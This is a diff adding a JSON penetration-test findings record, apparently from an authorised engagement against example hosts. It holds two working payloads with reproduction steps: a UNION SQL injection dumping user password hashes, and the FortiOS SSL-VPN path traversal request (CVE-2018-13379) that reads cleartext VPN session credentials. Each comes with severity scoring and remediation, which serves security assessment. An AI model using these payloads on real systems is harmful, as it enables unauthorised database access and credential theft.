@@ -1,0 +1,68 @@
+{
+  "engagement_id": "ACME-2026-001",
+  "scope_ref": "contracts/scope.json",
+  "phase": "reporting",
+  "updated_at": "2026-06-11T12:00:00Z",
+  "targets": [
+    {
+      "target_id": "T-001",
+      "asset": "https://app.acme.example",
+      "asset_type": "url",
+      "in_scope": true,
+      "discovered_by": "osint-recon",
+      "technologies": ["nginx", "PHP 8.1", "MySQL"]
+    },
+    {
+      "target_id": "T-002",
+      "asset": "203.0.113.10",
+      "asset_type": "ip",
+      "in_scope": true,
+      "discovered_by": "active-recon",
+      "open_ports": [{ "port": 10443, "protocol": "tcp", "service": "Fortinet SSL-VPN", "version": "FortiOS 6.0.4" }]
+    }
+  ],
+  "findings": [
+    {
+      "finding_id": "F-001",
+      "target_id": "T-001",
+      "title": "Inyección SQL no autenticada en el parámetro id de /buscar",
+      "status": "exploited",
+      "severity": "critical",
+      "cvss": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cwe": "CWE-89",
+      "owasp": "A03:2021-Injection",
+      "attack_technique": "T1190",
+      "exploit_public": false,
+      "evidence": "GET /buscar?id=1' UNION SELECT usuario,password,3 FROM usuarios-- - devolvió 50.123 filas con hashes bcrypt.",
+      "reproduction": "1. Abrir https://app.acme.example/buscar?id=1\n2. Inyectar ' UNION SELECT usuario,password,3 FROM usuarios-- -\n3. Observar el volcado en la respuesta.",
+      "impact": "Lectura completa de la base de datos de clientes.",
+      "remediation": "Usar consultas parametrizadas (prepared statements) y validar el tipo del parámetro id.",
+      "confirmed_by": "web-exploit",
+      "source_refs": ["https://owasp.org/Top10/A03_2021-Injection/"]
+    },
+    {
+      "finding_id": "F-002",
+      "target_id": "T-002",
+      "title": "FortiOS SSL-VPN vulnerable a path traversal (CVE-2018-13379)",
+      "status": "confirmed",
+      "severity": "critical",
+      "cvss": 9.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
+      "cwe": "CWE-22",
+      "attack_technique": "T1190",
+      "cve": ["CVE-2018-13379"],
+      "epss": 0.945,
+      "exploit_public": true,
+      "exploit_sources": ["ExploitDB"],
+      "ssvc": { "options": [{ "Exploitation": "active" }, { "Automatable": "yes" }] },
+      "evidence": "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession reveló credenciales de sesión en texto claro.",
+      "reproduction": "1. Petición a /remote/fgt_lang con el payload de path traversal.\n2. Recuperar sslvpn_websession con usuarios y contraseñas.",
+      "impact": "Robo de credenciales VPN válidas y acceso a la red interna.",
+      "remediation": "Actualizar FortiOS a una versión parcheada (>= 6.0.5 / 6.2.0) y rotar todas las credenciales VPN.",
+      "confirmed_by": "network-exploit",
+      "source_refs": ["https://www.cisa.gov/known-exploited-vulnerabilities-catalog", "https://nvd.nist.gov/vuln/detail/CVE-2018-13379"]
+    }
+  ],
+  "evidence": []
+}
